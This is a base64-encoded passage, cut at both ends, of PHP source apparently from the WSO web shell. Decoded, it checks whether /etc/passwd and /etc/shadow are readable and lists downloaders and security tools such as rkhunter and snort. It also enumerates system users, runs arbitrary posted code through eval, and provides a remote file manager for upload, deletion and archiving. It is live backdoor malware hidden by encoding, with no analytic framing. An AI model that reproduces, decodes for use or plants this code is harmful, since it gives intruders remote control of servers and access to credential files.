GFyYW0oJ1JlYWRhYmxlIC9ldGMvcGFzc3dkJywgQGlzX3JlYWRhYmxlKCcvZXRjL3Bhc3N3ZCcpPyJ5ZXMgPGEgaHJlZj0nIycgb25jbGljaz0nZyhcIkZpbGVzVG9vbHNcIiwgXCIvZXRjL1wiLCBcInBhc3N3ZFwiKSc+W3ZpZXddPC9hPiI6J25vJyk7CiAgICAgICAgICAgIHdzb1NlY1BhcmFtKCdSZWFkYWJsZSAvZXRjL3NoYWRvdycsIEBpc19yZWFkYWJsZSgnL2V0Yy9zaGFkb3cnKT8ieWVzIDxhIGhyZWY9JyMnIG9uY2xpY2s9J2coXCJGaWxlc1Rvb2xzXCIsIFwiL2V0Yy9cIiwgXCJzaGFkb3dcIiknPlt2aWV3XTwvYT4iOidubycpOwogICAgICAgICAgICB3c29TZWNQYXJhbSgnT1MgdmVyc2lvbicsIEBmaWxlX2dldF9jb250ZW50cygnL3Byb2MvdmVyc2lvbicpKTsKICAgICAgICAgICAgd3NvU2VjUGFyYW0oJ0Rpc3RyIG5hbWUnLCBAZmlsZV9nZXRfY29udGVudHMoJy9ldGMvaXNzdWUubmV0JykpOwogICAgICAgICAgICBpZighJEdMT0JBTFNbJ3NhZmVfbW9kZSddKSB7CiAgICAgICAgICAgICAgICAkdXNlcmZ1bCA9IGFycmF5KCdnY2MnLCdsY2MnLCdjYycsJ2xkJywnbWFrZScsJ3BocCcsJ3BlcmwnLCdweXRob24nLCdydWJ5JywndGFyJywnZ3ppcCcsJ2J6aXAnLCdiemlwMicsJ25jJywnbG9jYXRlJywnc3VpZHBlcmwnKTsKICAgICAgICAgICAgICAgICRkYW5nZXIgPSBhcnJheSgna2F2Jywnbm9kMzInLCdiZGNvcmVkJywndXZzY2FuJywnc2F2JywnZHJ3ZWJkJywnY2xhbWQnLCdya2h1bnRlcicsJ2Noa3Jvb3RraXQnLCdpcHRhYmxlcycsJ2lwZncnLCd0cmlwd2lyZScsJ3NoaWVsZGNjJywncG9ydHNlbnRyeScsJ3Nub3J0Jywnb3NzZWMnLCdsaWRzYWRtJywndGNwbG9kZycsJ3N4aWQnLCdsb2djaGVjaycsJ2xvZ3dhdGNoJywnc3lzbWFzaycsJ3ptYnNjYXAnLCdzYXdtaWxsJywnd29ybXNjYW4nLCduaW5qYScpOwogICAgICAgICAgICAgICAgJGRvd25sb2FkZXJzID0gYXJyYXkoJ3dnZXQnLCdmZXRjaCcsJ2x5bngnLCdsaW5rcycsJ2N1cmwnLCdnZXQnLCdsd3AtbWlycm9yJyk7CiAgICAgICAgICAgICAgICBlY2hvICc8YnI+JzsKICAgICAgICAgICAgICAgICR0ZW1wPWFycmF5KCk7CiAgICAgICAgICAgICAgICBmb3JlYWNoICgkdXNlcmZ1bCBhcyAkaXRlbSkKICAgICAgICAgICAgICAgICAgICBpZih3c29XaGljaCgkaXRlbSkpCiAgICAgICAgICAgICAgICAgICAgICAgICR0ZW1wW10gPSAkaXRlbTsKICAgICAgICAgICAgICAgIHdzb1NlY1BhcmFtKCdVc2VyZnVsJywgaW1wbG9kZSgnLCAnLCR0ZW1wKSk7CiAgICAgICAgICAgICAgICAkdGVtcD1hcnJheSgpOwogICAgICAgICAgICAgICAgZm9yZWFjaCAoJGRhbmdlciBhcyAkaXRlbSkKICAgICAgICAgICAgICAgICAgICBpZih3c29XaGljaCgkaXRlbSkpCiAgICAgICAgICAgICAgICAgICAgICAgICR0ZW1wW10gPSAkaXRlbTsKICAgICAgICAgICAgICAgIHdzb1NlY1BhcmFtKCdEYW5nZXInLCBpbXBsb2RlKCcsICcsJHRlbXApKTsKICAgICAgICAgICAgICAgICR0ZW1wPWFycmF5KCk7CiAgICAgICAgICAgICAgICBmb3JlYWNoICgkZG93bmxvYWRlcnMgYXMgJGl0ZW0pCiAgICAgICAgICAgICAgICAgICAgaWYod3NvV2hpY2goJGl0ZW0pKQogICAgICAgICAgICAgICAgICAgICAgICAkdGVtcFtdID0gJGl0ZW07CiAgICAgICAgICAgICAgICB3c29TZWNQYXJhbSgnRG93bmxvYWRlcnMnLCBpbXBsb2RlKCcsICcsJHRlbXApKTsKICAgICAgICAgICAgICAgIGVjaG8gJzxici8+JzsKICAgICAgICAgICAgICAgIHdzb1NlY1BhcmFtKCdIREQgc3BhY2UnLCB3c29FeCgnZGYgLWgnKSk7CiAgICAgICAgICAgICAgICB3c29TZWNQYXJhbSgnSG9zdHMnLCBAZmlsZV9nZXRfY29udGVudHMoJy9ldGMvaG9zdHMnKSk7CiAgICAgICAgICAgICAgICBlY2hvICc8YnIvPjxzcGFuPnBvc2l4X2dldHB3dWlkICgiUmVhZCIgL2V0Yy9wYXNzd2QpPC9zcGFuPjx0YWJsZT48Zm9ybSBvbnN1Ym1pdD1cJ2cobnVsbCxudWxsLCI1Iix0aGlzLnBhcmFtMS52YWx1ZSx0aGlzLnBhcmFtMi52YWx1ZSk7cmV0dXJuIGZhbHNlO1wnPjx0cj48dGQ+RnJvbTwvdGQ+PHRkPjxpbnB1dCB0eXBlPXRleHQgbmFtZT1wYXJhbTEgdmFsdWU9MD48L3RkPjwvdHI+PHRyPjx0ZD5UbzwvdGQ+PHRkPjxpbnB1dCB0eXBlPXRleHQgbmFtZT1wYXJhbTIgdmFsdWU9MTAwMD48L3RkPjwvdHI+PC90YWJsZT48aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9Ij4+Ij48L2Zvcm0+JzsKICAgICAgICAgICAgICAgIGlmIChpc3NldCAoJF9QT1NUWydwMiddLCAkX1BPU1RbJ3AzJ10pICYmIGlzX251bWVyaWMoJF9QT1NUWydwMiddKSAmJiBpc19udW1lcmljKCRfUE9TVFsncDMnXSkpIHsKICAgICAgICAgICAgICAgICAgICAkdGVtcCA9ICIiOwogICAgICAgICAgICAgICAgICAgIGZvcig7JF9QT1NUWydwMiddIDw9ICRfUE9TVFsncDMnXTskX1BPU1RbJ3AyJ10rKykgewogICAgICAgICAgICAgICAgICAgICAgICAkdWlkID0gQHBvc2l4X2dldHB3dWlkKCRfUE9TVFsncDInXSk7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkdWlkKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRlbXAgLj0gam9pbignOicsJHVpZCkuIlxuIjsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWNobyAnPGJyLz4nOwogICAgICAgICAgICAgICAgICAgIHdzb1NlY1BhcmFtKCdVc2VycycsICR0ZW1wKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoJfSBlbHNlIHsKCQl3c29TZWNQYXJhbSgnT1MgVmVyc2lvbicsd3NvRXgoJ3ZlcicpKTsKCQl3c29TZWNQYXJhbSgnQWNjb3VudCBTZXR0aW5ncycsd3NvRXgoJ25ldCBhY2NvdW50cycpKTsKCQl3c29TZWNQYXJhbSgnVXNlciBBY2NvdW50cycsd3NvRXgoJ25ldCB1c2VyJykpOwoJfQoJZWNobyAnPC9kaXY+JzsKCXdzb0Zvb3RlcigpOwp9CgpmdW5jdGlvbiBhY3Rpb25QaHAoKSB7CglpZihpc3NldCgkX1BPU1RbJ2FqYXgnXSkpIHsKICAgICAgICBXU09zZXRjb29raWUobWQ1KCRfU0VSVkVSWydIVFRQX0hPU1QnXSkgLiAnYWpheCcsIHRydWUpOwoJCW9iX3N0YXJ0KCk7CgkJZXZhbCgkX1BPU1RbJ3AxJ10pOwoJCSR0ZW1wID0gImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdQaHBPdXRwdXQnKS5zdHlsZS5kaXNwbGF5PScnO2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdQaHBPdXRwdXQnKS5pbm5lckhUTUw9JyIgLiBhZGRjc2xhc2hlcyhodG1sc3BlY2lhbGNoYXJzKG9iX2dldF9jbGVhbigpKSwgIlxuXHJcdFxcJ1wwIikgLiAiJztcbiI7CgkJZWNobyBzdHJsZW4oJHRlbXApLCAiXG4iLCAkdGVtcDsKCQlleGl0OwoJfQogICAgaWYoZW1wdHkoJF9QT1NUWydhamF4J10pICYmICFlbXB0eSgkX1BPU1RbJ3AxJ10pKQogICAgICAgIFdTT3NldGNvb2tpZShtZDUoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKSAuICdhamF4JywgMCk7CgoJd3NvSGVhZGVyKCk7CglpZihpc3NldCgkX1BPU1RbJ3AyJ10pICYmICgkX1BPU1RbJ3AyJ10gPT0gJ2luZm8nKSkgewoJCWVjaG8gJzxoMT5QSFAgaW5mbzwvaDE+PGRpdiBjbGFzcz1jb250ZW50PjxzdHlsZT4ucCB7Y29sb3I6IzAwMDt9PC9zdHlsZT4nOwoJCW9iX3N0YXJ0KCk7CgkJcGhwaW5mbygpOwoJCSR0bXAgPSBvYl9nZXRfY2xlYW4oKTsKICAgICAgICAkdG1wID0gcHJlZ19yZXBsYWNlKGFycmF5ICgKICAgICAgICAgICAgJyEoYm9keXxhOlx3K3xib2R5LCB0ZCwgdGgsIGgxLCBoMikgey4qfSFtc2lVJywKICAgICAgICAgICAgJyF0ZCwgdGggeyguKil9IW1zaVUnLAogICAgICAgICAgICAnITxpbWdbXj5dKz4hbXNpVScsCiAgICAgICAgKSwgYXJyYXkgKAogICAgICAgICAgICAnJywKICAgICAgICAgICAgJy5lLCAudiwgLmgsIC5oIHRoIHskMX0nLAogICAgICAgICAgICAnJwogICAgICAgICksICR0bXApOwoJCWVjaG8gc3RyX3JlcGxhY2UoJzxoMScsJzxoMicsICR0bXApIC4nPC9kaXY+PGJyPic7Cgl9CiAgICBlY2hvICc8aDE+RXhlY3V0aW9uIFBIUC1jb2RlPC9oMT48ZGl2IGNsYXNzPWNvbnRlbnQ+PGZvcm0gbmFtZT1wZiBtZXRob2Q9cG9zdCBvbnN1Ym1pdD0iaWYodGhpcy5hamF4LmNoZWNrZWQpe2EoXCdQaHBcJyxudWxsLHRoaXMuY29kZS52YWx1ZSk7fWVsc2V7ZyhcJ1BocFwnLG51bGwsdGhpcy5jb2RlLnZhbHVlLFwnXCcpO31yZXR1cm4gZmFsc2U7Ij48dGV4dGFyZWEgbmFtZT1jb2RlIGNsYXNzPWJpZ2FyZWEgaWQ9UGhwQ29kZT4nLighZW1wdHkoJF9QT1NUWydwMSddKT9odG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsncDEnXSk6JycpLic8L3RleHRhcmVhPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT1FdmFsIHN0eWxlPSJtYXJnaW4tdG9wOjVweCI+JzsKCWVjaG8gJyA8aW5wdXQgdHlwZT1jaGVja2JveCBuYW1lPWFqYXggdmFsdWU9MSAnLigkX0NPT0tJRVttZDUoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKS4nYWpheCddPydjaGVja2VkJzonJykuJz4gc2VuZCB1c2luZyBBSkFYPC9mb3JtPjxwcmUgaWQ9UGhwT3V0cHV0IHN0eWxlPSInLihlbXB0eSgkX1BPU1RbJ3AxJ10pPydkaXNwbGF5Om5vbmU7JzonJykuJ21hcmdpbi10b3A6NXB4OyIgY2xhc3M9bWwxPic7CglpZighZW1wdHkoJF9QT1NUWydwMSddKSkgewoJCW9iX3N0YXJ0KCk7CgkJZXZhbCgkX1BPU1RbJ3AxJ10pOwoJCWVjaG8gaHRtbHNwZWNpYWxjaGFycyhvYl9nZXRfY2xlYW4oKSk7Cgl9CgllY2hvICc8L3ByZT48L2Rpdj4nOwoJd3NvRm9vdGVyKCk7Cn0KCmZ1bmN0aW9uIGFjdGlvbkZpbGVzTWFuKCkgewogICAgaWYgKCFlbXB0eSAoJF9DT09LSUVbJ2YnXSkpCiAgICAgICAgJF9DT09LSUVbJ2YnXSA9IEB1bnNlcmlhbGl6ZSgkX0NPT0tJRVsnZiddKTsKCglpZighZW1wdHkoJF9QT1NUWydwMSddKSkgewoJCXN3aXRjaCgkX1BPU1RbJ3AxJ10pIHsKCQkJY2FzZSAndXBsb2FkRmlsZSc6CgkJCQlpZighQG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2YnXVsnbmFtZSddKSkKCQkJCQllY2hvICJDYW4ndCB1cGxvYWQgZmlsZSEiOwoJCQkJYnJlYWs7CgkJCWNhc2UgJ21rZGlyJzoKCQkJCWlmKCFAbWtkaXIoJF9QT1NUWydwMiddKSkKCQkJCQllY2hvICJDYW4ndCBjcmVhdGUgbmV3IGRpciI7CgkJCQlicmVhazsKCQkJY2FzZSAnZGVsZXRlJzoKCQkJCWZ1bmN0aW9uIGRlbGV0ZURpcigkcGF0aCkgewoJCQkJCSRwYXRoID0gKHN1YnN0cigkcGF0aCwtMSk9PScvJykgPyAkcGF0aDokcGF0aC4nLyc7CgkJCQkJJGRoICA9IG9wZW5kaXIoJHBhdGgpOwoJCQkJCXdoaWxlICggKCRpdGVtID0gcmVhZGRpcigkZGgpICkgIT09IGZhbHNlKSB7CgkJCQkJCSRpdGVtID0gJHBhdGguJGl0ZW07CgkJCQkJCWlmICggKGJhc2VuYW1lKCRpdGVtKSA9PSAiLi4iKSB8fCAoYmFzZW5hbWUoJGl0ZW0pID09ICIuIikgKQoJCQkJCQkJY29udGludWU7CgkJCQkJCSR0eXBlID0gZmlsZXR5cGUoJGl0ZW0pOwoJCQkJCQlpZiAoJHR5cGUgPT0gImRpciIpCgkJCQkJCQlkZWxldGVEaXIoJGl0ZW0pOwoJCQkJCQllbHNlCgkJCQkJCQlAdW5saW5rKCRpdGVtKTsKCQkJCQl9CgkJCQkJY2xvc2VkaXIoJGRoKTsKCQkJCQlAcm1kaXIoJHBhdGgpOwoJCQkJfQoJCQkJaWYoaXNfYXJyYXkoQCRfUE9TVFsnZiddKSkKCQkJCQlmb3JlYWNoKCRfUE9TVFsnZiddIGFzICRmKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRmID09ICcuLicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKCQkJCQkJJGYgPSB1cmxkZWNvZGUoJGYpOwoJCQkJCQlpZihpc19kaXIoJGYpKQoJCQkJCQkJZGVsZXRlRGlyKCRmKTsKCQkJCQkJZWxzZQoJCQkJCQkJQHVubGluaygkZik7CgkJCQkJfQoJCQkJYnJlYWs7CgkJCWNhc2UgJ3Bhc3RlJzoKCQkJCWlmKCRfQ09PS0lFWydhY3QnXSA9PSAnY29weScpIHsKCQkJCQlmdW5jdGlvbiBjb3B5X3Bhc3RlKCRjLCRzLCRkKXsKCQkJCQkJaWYoaXNfZGlyKCRjLiRzKSl7CgkJCQkJCQlta2RpcigkZC4kcyk7CgkJCQkJCQkkaCA9IEBvcGVuZGlyKCRjLiRzKTsKCQkJCQkJCXdoaWxlICgoJGYgPSBAcmVhZGRpcigkaCkpICE9PSBmYWxzZSkKCQkJCQkJCQlpZiAoKCRmICE9ICIuIikgYW5kICgkZiAhPSAiLi4iKSkKCQkJCQkJCQkJY29weV9wYXN0ZSgkYy4kcy4nLycsJGYsICRkLiRzLicvJyk7CgkJCQkJCX0gZWxzZWlmKGlzX2ZpbGUoJGMuJHMpKQoJCQkJCQkJQGNvcHkoJGMuJHMsICRkLiRzKTsKCQkJCQl9CgkJCQkJZm9yZWFjaCgkX0NPT0tJRVsnZiddIGFzICRmKQoJCQkJCQljb3B5X3Bhc3RlKCRfQ09PS0lFWydjJ10sJGYsICRHTE9CQUxTWydjd2QnXSk7CgkJCQl9IGVsc2VpZigkX0NPT0tJRVsnYWN0J10gPT0gJ21vdmUnKSB7CgkJCQkJZnVuY3Rpb24gbW92ZV9wYXN0ZSgkYywkcywkZCl7CgkJCQkJCWlmKGlzX2RpcigkYy4kcykpewoJCQkJCQkJbWtkaXIoJGQuJHMpOwoJCQkJCQkJJGggPSBAb3BlbmRpcigkYy4kcyk7CgkJCQkJCQl3aGlsZSAoKCRmID0gQHJlYWRkaXIoJGgpKSAhPT0gZmFsc2UpCgkJCQkJCQkJaWYgKCgkZiAhPSAiLiIpIGFuZCAoJGYgIT0gIi4uIikpCgkJCQkJCQkJCWNvcHlfcGFzdGUoJGMuJHMuJy8nLCRmLCAkZC4kcy4nLycpOwoJCQkJCQl9IGVsc2VpZihAaXNfZmlsZSgkYy4kcykpCgkJCQkJCQlAY29weSgkYy4kcywgJGQuJHMpOwoJCQkJCX0KCQkJCQlmb3JlYWNoKCRfQ09PS0lFWydmJ10gYXMgJGYpCgkJCQkJCUByZW5hbWUoJF9DT09LSUVbJ2MnXS4kZiwgJEdMT0JBTFNbJ2N3ZCddLiRmKTsKCQkJCX0gZWxzZWlmKCRfQ09PS0lFWydhY3QnXSA9PSAnemlwJykgewoJCQkJCWlmKGNsYXNzX2V4aXN0cygnWmlwQXJjaGl2ZScpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICR6aXAgPSBuZXcgWmlwQXJjaGl2ZSgpOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHppcC0+b3BlbigkX1BPU1RbJ3AyJ10sIDEpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGRpcigkX0NPT0tJRVsnYyddKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2goJF9DT09LSUVbJ2YnXSBhcyAkZikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRmID09ICcuLicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKEBpc19maWxlKCRfQ09PS0lFWydjJ10uJGYpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkemlwLT5hZGRGaWxlKCRfQ09PS0lFWydjJ10uJGYsICRmKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoQGlzX2RpcigkX0NPT0tJRVsnYyddLiRmKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaXRlcmF0b3IgPSBuZXcgUmVjdXJzaXZlSXRlcmF0b3JJdGVyYXRvcihuZXcgUmVjdXJzaXZlRGlyZWN0b3J5SXRlcmF0b3IoJGYuJy8nLCBGaWxlc3lzdGVtSXRlcmF0b3I6OlNLSVBfRE9UUykpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoICgkaXRlcmF0b3IgYXMgJGtleT0+JHZhbHVlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkemlwLT5hZGRGaWxlKHJlYWxwYXRoKCRrZXkpLCAka2V5KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNoZGlyKCRHTE9CQUxTWydjd2QnXSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkemlwLT5jbG9zZSgpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQoJCQkJfSBlbHNlaWYoJF9DT09LSUVbJ2FjdCddID09ICd1bnppcCcpIHsKCQkJCQlpZihjbGFzc19leGlzdHMoJ1ppcEFyY2hpdmUnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkemlwID0gbmV3IFppcEFyY2hpdmUoKTsKICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCgkX0NPT0tJRVsnZiddIGFzICRmKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkemlwLT5vcGVuKCRfQ09PS0lFWydjJ10uJGYpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHppcC0+ZXh0cmFjdFRvKCRHTE9CQUxTWydjd2QnXSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHppcC0+Y2xvc2UoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KCQkJCX0gZWxzZWlmKCRfQ09PS0lFWydhY3QnXSA9PSAndGFyJykgewogICAgICAgICAgICAgICAgICAgIGNoZGlyKCRfQ09PS0lFWydjJ10pOwogICAgICAgICAgICAgICAgICAgICRfQ09PS0lFWydmJ10gPSBhcnJheV9tYXAoJ2VzY2FwZXNoZWxsYXJnJywgJF9DT09LSUVbJ2YnXSk7CiAgICAgICAgICAgICAgICAgICAgd3NvRXgoJ3RhciBjZnp2ICcgLiBlc2NhcGVzaGVsbGFyZygkX1BPU1RbJ3AyJ10pIC4gJyAnIC4gaW1wbG9kZSgnICcsICRfQ09PS0lFWydmJ10pKTsKICAgICAgICAgICAgICAgICAgICBjaGRpcigkR0xPQkFMU1snY3dkJ10pOwoJCQkJfQoJCQkJdW5zZXQoJF9DT09LSUVbJ2YnXSk7CiAgICAgICAgICAgICAgICBzZXRjb29raWUoJ2YnLCAnJywgdGltZSgpIC0gMzYwMCk7CgkJCQlicmVhazsKCQkJZGVmYXVsdDoKICAgICAgICAgICAgICAgIGlmKCFlbXB0eSgkX1BPU1RbJ3AxJ10pKSB7CgkJCQkJV1NPc2V0Y29va2llKCdhY3QnLCAkX1BPU1RbJ3AxJ10pOwoJCQkJCVdTT3NldGNvb2tpZSgnZicsIHNlcmlhbGl6ZShAJF9QT1NUWydmJ10pKTsKCQkJCQlXU09zZXRjb29raWUoJ2MnLCBAJF9QT1NUWydjJ10pOwoJCQkJfQoJCQkJYnJlYWs7CgkJfQoJfQogICAgd3NvSGVhZGVyKCk7CgllY2hvICc8aDE+RmlsZSBtYW5hZ2VyPC9oMT48ZGl2IGNsYXNzPWNvbnRlbnQ+PHNjcmlwdD5wMV89cDJfPXAzXz0iIjs8L3NjcmlwdD4nOwoJJGRpckNvbnRlbnQgPSB3c29TY2FuZGlyKGlzc2V0KCRfUE9TVFsnYyddKT8kX1BPU1RbJ2MnXTokR0xPQkFMU1snY3dkJ10pOwoJaWYoJGRpckNvbnRlbnQgPT09IGZhbHNlKSB7CWVjaG8gJ0NhblwndCBvcGVuIHRoaXMgZm9sZGVyISc7d3NvRm9vdGVyKCk7IHJldHVybjsgfQoJZ2xvYmFsICRzb3J0OwoJJHNvcnQgPSBhcnJheSgnbmFtZScsIDEpOwoJaWYoIWVtcHR5KCRfUE9TVFsncDEnXSkpIHsKCQlpZihwcmVnX21hdGNoKCchc18oW0Etel0rKV8oXGR7MX0pIScsICRfUE9TVFsncDEnXSwgJG1hdGNoKSkKCQkJJHNvcnQgPSBhcnJheSgkbWF0Y2hbMV0sIChpbnQpJG1hdGNoWzJdKTsKCX0KZWNobyAiPHNjcmlwdD4KCWZ1bmN0aW9uIHNhKCkgewoJCWZvcihpPTA7aTxkLmZpbGVzLmVsZW1lbnRzLmxlbmd0aDtpKyspCgkJCWlmKGQuZmlsZXMuZWxlbWVudHNbaV0udHlwZSA9PSAnY2hlY2tib3gnKQoJCQkJZC5maWxlcy5lbGVtZW50c1tpXS5jaGVja2VkID0gZC5maWxlcy5lbGVtZW50c1swXS5jaGVja2VkOwoJfQo8L3NjcmlwdD4KPHRhYmxlIHdpZHRoPScxMDAlJyBjbGFzcz0nbWFpbicgY2VsbHNwYWNpbmc9JzAnIGNlbGxwYWRkaW5nPScyJz4KPGZvcm0gbmFtZT1maWxlcyBtZXRob2Q9cG9zdD48dHI+PHRoIHdpZHRoPScxM3B4Jz48aW5wdXQgdHlwZT1jaGVja2JveCBvbmNsaWNrPSdzYSgpJyBjbGFzcz1jaGtieD48L3RoPjx0aD48YSBocmVmPScjJyBvbmNsaWNrPSdnKFwiRmlsZXNNYW5cIixudWxsLFwic19uYW1lXyIuKCRzb3J0WzFdPzA6MSkuIlwiKSc+TmFtZTwvYT48L3RoPjx0aD48YSBocmVmPScjJyBvbmNsaWNrPSdnKFwiRmlsZXNNYW5cIixudWxsLFwic19zaXplXyIuKCRzb3J0WzFdPzA6MSkuIlwiKSc+U2l6ZTwvYT48L3RoPjx0aD48YSBocmVmPScjJyBvbmNsaWNrPSdnKFwiRmlsZXNNYW5cIixudWxsLFwic19tb2RpZnlfIi4oJHNvcnRbMV0/MDoxKS4iXCIpJz5Nb2RpZnk8L2E+PC90aD48dGg+T3duZXIvR3JvdXA8L3RoPjx0aD48YSBocmVmPScjJyBvbmNsaWNrPSdnKFwiRmlsZXNNYW5cIixudWxsLFwic19wZXJtc18iLigkc29ydFsxXT8wOjEpLiJcIiknPlBlcm1pc3Npb25zPC9hPjwvdGg+PHRoPkFjdGlvbnM8L3RoPjwvdHI+IjsKCSRkaXJzID0gJGZpbGVzID0gYXJyYXkoKTsKCSRuID0gY291bnQoJGRpckNvbnRlbnQpOwoJZm9yKCRpPTA7JGk8JG47JGkrKykgewoJCSRvdyA9IEBwb3NpeF9nZXRwd3VpZChAZmlsZW93bmVyKCRkaXJDb250ZW50WyRpXSkpOwoJCSRnciA9IEBwb3NpeF9nZXRncmdpZChAZmlsZWdyb3VwKCRkaXJDb250ZW50WyRpXSkpOwoJCSR0bXAgPSBhcnJheSgnbmFtZScgPT4gJGRpckNvbnRlbnRbJGldLAoJCQkJCSAncGF0aCcgPT4gJEdMT0JBTFNbJ2N3ZCddLiRkaXJDb250ZW50WyRpXSwKCQkJCQkgJ21vZGlmeScgPT4gZGF0ZSgnWS1tLWQgSDppOnMnLCBAZmlsZW10aW1lKCRHTE9CQUxTWydjd2QnXSAuICRkaXJDb250ZW50WyRpXSkpLAoJCQkJCSAncGVybXMnID0+IHdzb1Blcm1zQ29sb3IoJEdMT0JBTFNbJ2N3ZCddIC4gJGRpckNvbnRlbnRbJGldKSwKCQkJCQkgJ3NpemUnID0+IEBmaWxlc2l6ZSgkR0xPQkFMU1snY3dkJ10uJGRpckNvbnRlbnRbJGldKSwKCQkJCQkgJ293bmVyJyA9PiAkb3dbJ25hbWUnXT8kb3dbJ25hbWUnXTpAZmlsZW93bmVyKCRkaXJDb250ZW50WyRpXSksCgkJCQkJICdncm91cCcgPT4gJGdyWyduYW1lJ10/JGdyWyduYW1lJ106QGZpbGVncm91cCgkZGlyQ29udGVudFskaV0pCgkJCQkJKTsKCQlpZihAaXNfZmlsZSgkR0xPQkFMU1snY3dkJ10gLiAkZGlyQ29udGVudFskaV0pKQoJCQkkZmlsZXNbXSA9IGFycmF5X21lcmdlKCR0bXAsIGFycmF5KCd0eXBlJyA9PiAnZmlsZScpKTsKCQllbHNlaWYoQGlzX2xpbmsoJEdMT0JBTFNbJ2N3ZCddIC4gJGRpckNvbnRlbnRbJGldKSkKCQkJJGRpcnNbXSA9IGFycmF5X21lcmdlKCR0bXAsIGFycmF5KCd0eXBlJyA9PiAnbGluaycsICdsaW5rJyA9PiByZWFkbGluaygkdG1wWydwYXRoJ10pKSk7CgkJZWxzZWlmKEBpc19kaXIoJEdMT0JBTFNbJ2N3ZCddIC4gJGRpckNvbnRlbnRbJGldKSkKCQkJJGRpcnNbXSA9IGFycmF5X21lcmdlKCR0bXAsIGFycmF5KCd0eXBlJyA9PiAnZGlyJykpOwoJfQoJJEdMT0JBTFNbJ3NvcnQnXSA9ICRzb3J0OwoJZnVuY3Rpb24gd3NvQ21wKCRhLCAkYikgewoJCWlmKCRHTE9CQUxTWydzb3J0J11bMF0gIT0gJ3NpemUnKQoJCQlyZXR1cm4gc3RyY21wKHN0cnRvbG93ZXIoJGFbJEdMT0JBTFNbJ3NvcnQnXVswXV0pLCBzdHJ0b2xvd2VyKCRiWyRHTE9CQUxTWydzb3J0J11bMF1dKSkqKCRHTE9CQUxTWydzb3J0J11bMV0/MTotMSk7CgkJZWxzZQoJCQlyZXR1cm4gKCgkYVsnc2l6ZSddIDwgJGJbJ3NpemUnXSkgPyAtMSA6IDEpKigkR0xPQkFMU1snc29ydCddWzFdPzE6LTEpOwoJfQoJdXNvcnQoJGZpbGVzLCAid3NvQ21wIik7Cgl1c29ydCgkZGlycywgIndzb0NtcCIpOwoJJGZpbGVzID0gYXJyYXlfbWVyZ2UoJGRpcnMsICRmaWxlcyk7CgkkbCA9IDA7Cglmb3JlYWNoKCRmaWxlcyBhcyAkZikgewoJCWVjaG8gJzx0cicuKCRsPycgY2xhc3M9bDEnOicnKS4nPjx0ZD48aW5wdXQgdHlwZT1jaGVja2JveCBuYW1lPSJmW10iIHZhbHVlPSInLnVybGVuY29kZSgkZlsnbmFtZSddKS4nIiBjbGFzcz1jaGtieD48L3RkPjx0ZD48YSBocmVmPSMgb25jbGljaz0iJy4oKCRmWyd0eXBlJ109PSdmaWxlJyk/J2coXCdGaWxlc1Rvb2xzXCcsbnVsbCxcJycudXJsZW5jb2RlKCRmWyduYW1lJ10pLidcJywgXCd2aWV3XCcpIj4nLmh0bWxzcGVjaWFsY2hhcnMoJGZbJ25hbWUnXSk6J2coXCdGaWxlc01hblwnLFwnJy4kZlsncGF0aCddLidcJyk7IiAnIC4gKGVtcHR5ICgkZlsnbGluayddKSA/ICcnIDogInRpdGxlPSd7JGZbJ2xpbmsnXX0nIikgLiAnPjxiPlsgJyAuIGh0bWxzcGVjaWFsY2hhcnMoJGZbJ25hbWUnXSkgLiAnIF08L2I+JykuJzwvYT48L3RkPjx0ZD4nLigoJGZbJ3R5cGUnXT09J2ZpbGUnKT93c29WaWV3U2l6ZSgkZlsnc2l6ZSddKTokZlsndHlwZSddKS4nPC90ZD48dGQ+Jy4kZlsnbW9kaWZ5J10uJzwvdGQ+PHRkPicuJGZbJ293bmVyJ10uJy8nLiRmWydncm91cCddLic8L3RkPjx0ZD48YSBocmVmPSMgb25jbGljaz0iZyhcJ0ZpbGVz